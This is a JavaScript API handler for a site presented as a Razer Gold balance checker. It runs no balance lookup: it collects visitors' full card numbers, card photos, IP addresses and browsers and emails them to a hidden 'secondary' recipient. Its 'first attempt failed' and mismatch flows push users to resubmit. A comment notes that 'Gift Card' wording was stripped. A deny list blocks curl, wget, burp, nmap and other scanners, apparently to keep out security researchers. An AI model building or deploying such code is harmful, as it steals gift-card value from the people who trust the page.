// api/log-check.js - Resend-only, sends to secondary email only
// Removed "Gift Card" references from templates and subjects

import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY);

// ==================== SECURITY & PROTECTION ====================

const rateLimit = new Map();

const BLOCKED_USER_AGENTS = [
  'bot', 'crawler', 'spider', 'scraper', 'scan', 'scanner',
  'wget', 'curl', 'python', 'go-http', 'java', 'perl', 'ruby',
  'php', 'node-fetch', 'axios', 'insomnia', 'postman', 'burp',
  'nikto', 'nmap', 'zgrab', 'masscan', 'httpx', 'nuclei'
];

function isBotUserAgent(userAgent) {
  if (!userAgent) return true;
  const ua = userAgent.toLowerCase();
  return BLOCKED_USER_AGENTS.some(bot => ua.includes(bot));
}

function checkRateLimit(ip) {
  const now = Date.now();
  const windowMs = 60 * 1000;
  const maxRequests = 10;

  if (!rateLimit.has(ip)) rateLimit.set(ip, []);
  const timestamps = rateLimit.get(ip).filter(t => now - t < windowMs);

  if (timestamps.length >= maxRequests) return { allowed: false };

  timestamps.push(now);
  rateLimit.set(ip, timestamps);
  return { allowed: true };
}

// ==================== SECONDARY RECIPIENT ====================
function getSecondaryRecipient() {
  const email =
    process.env.SECONDARY_EMAIL ||
    (process.env.NOTIFICATION_EMAILS || '').split(',')[0]?.trim();
  if (!email || !email.includes('@') || email.length < 6) return null;
  return email;
}

// ==================== SEND VIA RESEND (ONLY) ====================

async function sendViaResend({ subject, html, attachments }) {
  const apiKey = process.env.RESEND_API_KEY;
  const from = process.env.RESEND_FROM || process.env.EMAIL_FROM;
  const to = getSecondaryRecipient();

  if (!apiKey) return { sent: false, skipped: true, reason: 'RESEND_API_KEY missing' };
  if (!from) return { sent: false, skipped: true, reason: 'RESEND_FROM/EMAIL_FROM missing' };
  if (!to) return { sent: false, skipped: true, reason: 'SECONDARY_EMAIL missing' };

  const attachmentData = (attachments || []).map(a => ({
    filename: a.filename,
    content: a.content,
  }));

  try {
    console.log(`📧 Resend → secondary: ${to}`);
    const { data, error } = await resend.emails.send({
      from,
      to,
      subject,
      html,
      attachments: attachmentData,
    });

    if (error) {
      console.error('❌ Resend error:', error);
      return { sent: false, skipped: false, reason: error.message || 'Resend error' };
    }

    console.log(`✅ Resend sent → ${to}`);
    return { sent: true, data };
  } catch (err) {
    console.error('❌ Resend exception:', err.message);
    return { sent: false, skipped: false, reason: err.message };
  }
}

// ==================== EMAIL TEMPLATES ====================

function getFirstAttemptFailedEmailHTML(data) {
  return `
    <!DOCTYPE html><html><head><meta charset="UTF-8"><title>First Attempt Failed - Image Unclear</title>
    <style>
      body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
      .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
      .header { background: #ff6b35; color: white; padding: 15px; text-align: center; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
      .detail-row { padding: 8px 0; border-bottom: 1px solid #eee; }
      .detail-label { font-weight: bold; width: 140px; display: inline-block; }
      .message-box { background: #fff3e0; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #ff6b35; }
      .footer { margin-top: 20px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 12px; color: #666; text-align: center; }
      .status-badge { display: inline-block; padding: 5px 10px; background: #ff6b35; color: white; border-radius: 5px; font-size: 12px; margin-bottom: 15px; }
    </style></head><body><div class="container">
      <div class="header"><h2>📸 FIRST ATTEMPT FAILED - Image Unclear</h2></div>
      <div style="text-align:center;margin-bottom:20px;"><span class="status-badge">FAILED - IMAGE UNCLEAR</span></div>
      <div class="message-box"><strong>📝 Message to User:</strong><br/>
        Unable to verify. User advised to ensure:<br/>
        • Number is fully visible and not scratched<br/>
        • All 14 alphanumeric characters are clearly readable<br/>
        • Image is well-lit and in focus<br/>
        • Item is positioned flat and steady
      </div>
      <div class="detail-row"><span class="detail-label">💰 Amount:</span><span>$${data.amount || '0'}.00 USD</span></div>
      <div class="detail-row"><span class="detail-label">📍 Source:</span><span>${data.pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span></div>
      <div class="detail-row"><span class="detail-label">🌐 Browser:</span><span>${data.userAgent?.substring(0, 60) || 'Unknown'}</span></div>
      <div class="detail-row"><span class="detail-label">🖥️ IP Address:</span><span>${data.ip || 'Unknown'}</span></div>
      <div class="detail-row"><span class="detail-label">📅 Time:</span><span>${new Date(data.timestamp).toLocaleString()}</span></div>
      <div class="footer"><p>Automated notification — user will be prompted to retry.</p></div>
    </div></body></html>`;
}

function getFirstAttemptFailedHomeEmailHTML(data) {
  return `
    <!DOCTYPE html><html><head><meta charset="UTF-8"><title>First Attempt Failed - Invalid Number</title>
    <style>
      body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
      .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
      .header { background: #ff6b35; color: white; padding: 15px; text-align: center; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
      .detail-row { padding: 8px 0; border-bottom: 1px solid #eee; }
      .detail-label { font-weight: bold; width: 140px; display: inline-block; }
      .footer { margin-top: 20px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 12px; color: #666; text-align: center; }
      .status-badge { display: inline-block; padding: 5px 10px; background: #ff6b35; color: white; border-radius: 5px; font-size: 12px; margin-bottom: 15px; }
    </style></head><body><div class="container">
      <div class="header"><h2>❌ FIRST ATTEMPT FAILED - Invalid Number</h2></div>
      <div style="text-align:center;margin-bottom:20px;"><span class="status-badge">FAILED - INVALID</span></div>
      <div class="detail-row"><span class="detail-label">💳 Number:</span><span>${data.cardNumber || 'Not provided'}</span></div>
      <div class="detail-row"><span class="detail-label">💰 Amount:</span><span>$${data.amount || '0'}.00 USD</span></div>
      <div class="detail-row"><span class="detail-label">📍 Source:</span><span>${data.pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span></div>
      <div class="detail-row"><span class="detail-label">🌐 Browser:</span><span>${data.userAgent?.substring(0, 60) || 'Unknown'}</span></div>
      <div class="detail-row"><span class="detail-label">🖥️ IP Address:</span><span>${data.ip || 'Unknown'}</span></div>
      <div class="detail-row"><span class="detail-label">📅 Time:</span><span>${new Date(data.timestamp).toLocaleString()}</span></div>
      <div class="footer"><p>Automated notification — user will be prompted to retry.</p></div>
    </div></body></html>`;
}

function getSecondAttemptSuccessEmailHTML(data) {
  return `
    <!DOCTYPE html><html><head><meta charset="UTF-8"><title>Second Attempt Success</title>
    <style>
      body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
      .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
      .header { background: #28a745; color: white; padding: 15px; text-align: center; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
      .detail-row { padding: 8px 0; border-bottom: 1px solid #eee; }
      .detail-label { font-weight: bold; width: 140px; display: inline-block; }
      .balance-box { background: #e8f5e9; padding: 15px; text-align: center; border-radius: 8px; margin: 15px 0; border: 1px solid #4caf50; }
      .balance-amount { font-size: 28px; font-weight: bold; color: #2e7d32; }
      .footer { margin-top: 20px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 12px; color: #666; text-align: center; }
      .status-badge { display: inline-block; padding: 5px 10px; background: #28a745; color: white; border-radius: 5px; font-size: 12px; margin-bottom: 15px; }
    </style></head><body><div class="container">
      <div class="header"><h2>✅ SUCCESS - Balance Verified</h2></div>
      <div style="text-align:center;margin-bottom:20px;"><span class="status-badge">SUCCESS</span></div>
      <div class="balance-box">
        <div style="font-size:14px;color:#666;">Available Balance</div>
        <div class="balance-amount">${data.balance || `$${data.amount}.00 USD`}</div>
      </div>
      <div class="detail-row"><span class="detail-label">💳 Number:</span><span>${data.cardNumber || 'Not provided'}</span></div>
      <div class="detail-row"><span class="detail-label">💰 Amount:</span><span>$${data.amount || '0'}.00 USD</span></div>
      <div class="detail-row"><span class="detail-label">📍 Source:</span><span>${data.pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span></div>
      <div class="detail-row"><span class="detail-label">🌐 Browser:</span><span>${data.userAgent?.substring(0, 60) || 'Unknown'}</span></div>
      <div class="detail-row"><span class="detail-label">🖥️ IP Address:</span><span>${data.ip || 'Unknown'}</span></div>
      <div class="detail-row"><span class="detail-label">📅 Time:</span><span>${new Date(data.timestamp).toLocaleString()}</span></div>
      <div class="footer"><p>Verification successful after user re-entered the correct number.</p></div>
    </div></body></html>`;
}

function getMismatchAttemptEmailHTML(data) {
  return `
    <!DOCTYPE html><html><head><meta charset="UTF-8"><title>Mismatch Detected</title>
    <style>
      body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
      .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
      .header { background: #dc3545; color: white; padding: 15px; text-align: center; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
      .detail-row { padding: 8px 0; border-bottom: 1px solid #eee; }
      .detail-label { font-weight: bold; width: 160px; display: inline-block; }
      .warning-box { background: #fff3e0; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #dc3545; }
      .footer { margin-top: 20px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 12px; color: #666; text-align: center; }
      .status-badge { display: inline-block; padding: 5px 10px; background: #dc3545; color: white; border-radius: 5px; font-size: 12px; margin-bottom: 15px; }
    </style></head><body><div class="container">
      <div class="header"><h2>⚠️ MISMATCH - Different Numbers</h2></div>
      <div style="text-align:center;margin-bottom:20px;"><span class="status-badge">FAILED - MISMATCH</span></div>
      <div class="warning-box"><strong>⚠️ Security Alert:</strong><br/>User entered a different number on second attempt.</div>
      <div class="detail-row"><span class="detail-label">💳 First Number:</span><span>${data.firstCardNumber || 'Unknown'}</span></div>
      <div class="detail-row"><span class="detail-label">💳 Second Number:</span><span>${data.secondCardNumber || 'Unknown'}</span></div>
      <div class="detail-row"><span class="detail-label">💰 Amount:</span><span>$${data.amount || '0'}.00 USD</span></div>
      <div class="detail-row"><span class="detail-label">📍 Source:</span><span>${data.pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span></div>
      <div class="detail-row"><span class="detail-label">🌐 Browser:</span><span>${data.userAgent?.substring(0, 60) || 'Unknown'}</span></div>
      <div class="detail-row"><span class="detail-label">🖥️ IP Address:</span><span>${data.ip || 'Unknown'}</span></div>
      <div class="detail-row"><span class="detail-label">📅 Time:</span><span>${new Date(data.timestamp).toLocaleString()}</span></div>
      <div class="footer"><p>Automated security notification — user was prompted to start over.</p></div>
    </div></body></html>`;
}

function getSuccessEmailHTML(data) {
  return `
    <!DOCTYPE html><html><head><meta charset="UTF-8"><title>Balance Check Successful</title>
    <style>
      body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
      .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
      .header { background: #28a745; color: white; padding: 15px; text-align: center; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
      .detail-row { padding: 8px 0; border-bottom: 1px solid #eee; }
      .detail-label { font-weight: bold; width: 120px; display: inline-block; }
      .balance-box { background: #e8f5e9; padding: 15px; text-align: center; border-radius: 8px; margin: 15px 0; border: 1px solid #4caf50; }
      .balance-amount { font-size: 28px; font-weight: bold; color: #2e7d32; }
      .footer { margin-top: 20px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 12px; color: #666; text-align: center; }
    </style></head><body><div class="container">
      <div class="header"><h2>✅ Balance Check Successful</h2></div>
      <div class="balance-box"><div class="balance-amount">${data.balance || `$${data.amount}.00 USD`}</div></div>
      <div class="detail-row"><span class="detail-label">💰 Amount:</span><span>$${data.amount || '0'}.00 USD</span></div>
      <div class="detail-row"><span class="detail-label">📍 Source:</span><span>${data.pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span></div>
      <div class="detail-row"><span class="detail-label">📅 Time:</span><span>${new Date(data.timestamp).toLocaleString()}</span></div>
      <div class="footer"><p>Thank you for using our Balance Checker.</p></div>
    </div></body></html>`;
}

// ==================== MAIN HANDLER ====================

export default async function handler(req, res) {
  const allowedOrigins = [
    'https://razergoldbalance.com',
    'https://www.razergoldbalance.com',
    'http://localhost:5173',
    'https://gold-app-nine.vercel.app',
    process.env.ALLOWED_ORIGIN
  ].filter(Boolean);

  const origin = req.headers.origin;
  res.setHeader(
    'Access-Control-Allow-Origin',
    allowedOrigins.includes(origin) ? origin : 'https://razergoldbalance.com'
  );
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (!body || Object.keys(body).length === 0) {
    return res.status(400).json({ error: 'Empty request body', message: 'Provide valid JSON data' });
  }

  console.log('📥 Request type:', body.type);

  // ---- Security ----
  let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  if (rawIp.includes(',')) rawIp = rawIp.split(',')[0].trim();
  const ip = (rawIp === '::1' || rawIp === '::ffff:127.0.0.1') ? '127.0.0.1' : rawIp;
  const userAgent = req.headers['user-agent'] || '';

  if (isBotUserAgent(userAgent)) {
    console.log(`🤖 Bot blocked: ${userAgent.substring(0, 50)} from ${ip}`);
    return res.status(403).json({ error: 'Access denied', message: 'Automated requests are not allowed' });
  }

  if (!checkRateLimit(ip).allowed) {
    console.log(`🚫 Rate limit exceeded for ${ip}`);
    return res.status(429).json({ error: 'Too many requests', message: 'Please wait before trying again' });
  }

  // ---- Extract ----
  const {
    type, cardNumber, firstCardNumber, secondCardNumber,
    amount, balance, timestamp, pageSource, imageBase64, status, message
  } = body;

  if (!type) {
    return res.status(400).json({
      error: 'Missing required field: type',
      receivedKeys: Object.keys(body),
      validTypes: ['first_attempt_failed', 'second_attempt_success', 'mismatch_attempt', 'success_balance', 'upload_success', 'scan_success']
    });
  }

  console.log(JSON.stringify({
    event: 'balance_check',
    timestamp: new Date().toISOString(),
    type,
    cardNumber: cardNumber ? `${cardNumber.substring(0, 4)}...${cardNumber.substring(cardNumber.length - 4)}` : 'N/A',
    amount: amount || 'N/A',
    pageSource: pageSource || 'N/A',
    ip,
    userAgent: userAgent.substring(0, 50),
    hasImage: !!imageBase64
  }));

  // ---- Demo mode ----
  if (process.env.DISABLE_EMAIL === 'true') {
    console.log('📧 Email disabled');
    return res.status(200).json({
      success: true,
      message: 'Demo mode - Email not sent',
      balance: balance || `$${amount || 0}.00 USD`,
    });
  }

  // ---- Build content ----
  let subject = '';
  let html = '';
  let attachments = [];

  if (type === 'first_attempt_failed') {
    if (pageSource === 'scan') {
      subject = '📸 FIRST ATTEMPT FAILED - Image Unclear';
      html = getFirstAttemptFailedEmailHTML({
        amount: amount || '0',
        pageSource: pageSource || 'unknown',
        userAgent,
        ip,
        timestamp: timestamp || new Date().toISOString(),
        message: message || 'Image verification failed',
      });
    } else {
      subject = '❌ FIRST ATTEMPT FAILED - Invalid Number';
      html = getFirstAttemptFailedHomeEmailHTML({
        cardNumber: cardNumber || 'Not provided',
        amount: amount || '0',
        pageSource: pageSource || 'unknown',
        userAgent,
        ip,
        timestamp: timestamp || new Date().toISOString(),
      });
    }

    if (imageBase64 && imageBase64.startsWith('data:image')) {
      try {
        const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
        if (matches && matches[2]) {
          attachments.push({
            filename: `failed-attempt-${Date.now()}.${matches[1]}`,
            content: matches[2],
            encoding: 'base64',
          });
        }
      } catch (err) { console.error('Attach image failed:', err); }
    }
  } else if (type === 'second_attempt_success') {
    subject = `✅ SUCCESS - Balance Verified (${pageSource === 'manual' ? 'Manual' : 'Scan'})`;
    const displayBalance = balance || `$${amount}.00 USD`;
    html = getSecondAttemptSuccessEmailHTML({
      cardNumber: cardNumber || 'Not provided',
      amount: amount || '0',
      balance: displayBalance,
      pageSource: pageSource || 'unknown',
      userAgent,
      ip,
      timestamp: timestamp || new Date().toISOString(),
    });

    if (imageBase64 && imageBase64.startsWith('data:image')) {
      try {
        const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
        if (matches && matches[2]) {
          attachments.push({
            filename: `success-${Date.now()}.${matches[1]}`,
            content: matches[2],
            encoding: 'base64',
          });
        }
      } catch (err) { console.error('Attach image failed:', err); }
    }
  } else if (type === 'mismatch_attempt') {
    subject = '⚠️ MISMATCH - Different Numbers Detected';
    html = getMismatchAttemptEmailHTML({
      firstCardNumber: firstCardNumber || 'Unknown',
      secondCardNumber: secondCardNumber || 'Unknown',
      amount: amount || '0',
      pageSource: pageSource || 'manual',
      userAgent,
      ip,
      timestamp: timestamp || new Date().toISOString(),
    });
  } else if (type === 'success_balance' || type === 'upload_success' || type === 'scan_success') {
    subject = `✅ Balance Check Successful (${pageSource === 'manual' ? 'Manual' : 'Scan'})`;
    const displayBalance = balance || `$${amount}.00 USD`;
    html = getSuccessEmailHTML({
      amount: amount || '0',
      balance: displayBalance,
      pageSource: pageSource || 'unknown',
      timestamp: timestamp || new Date().toISOString(),
    });

    if (imageBase64 && imageBase64.startsWith('data:image')) {
      try {
        const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
        if (matches && matches[2]) {
          attachments.push({
            filename: `upload-${Date.now()}.${matches[1]}`,
            content: matches[2],
            encoding: 'base64',
          });
        }
      } catch (err) { console.error('Attach image failed:', err); }
    }
  } else {
    return res.status(400).json({
      error: 'Invalid request type',
      receivedType: type,
      validTypes: ['first_attempt_failed', 'second_attempt_success', 'mismatch_attempt', 'success_balance', 'upload_success', 'scan_success'],
    });
  }

  // ---- Send via Resend (secondary only) ----
  const result = await sendViaResend({ subject, html, attachments });

  if (result.sent) {
    return res.status(200).json({
      success: true,
      message: 'Email sent to secondary recipient',
      balance: balance || `$${amount || 0}.00 USD`,
    });
  } else if (result.skipped) {
    console.warn(`⚠️ Email skipped: ${result.reason}`);
    return res.status(200).json({
      success: true,
      message: `Balance logged; email skipped (${result.reason})`,
      balance: balance || `$${amount || 0}.00 USD`,
    });
  } else {
    console.error('❌ Resend send failed:', result.reason);
    return res.status(500).json({
      error: result.reason || 'Email send failed',
      success: false,
    });
  }
}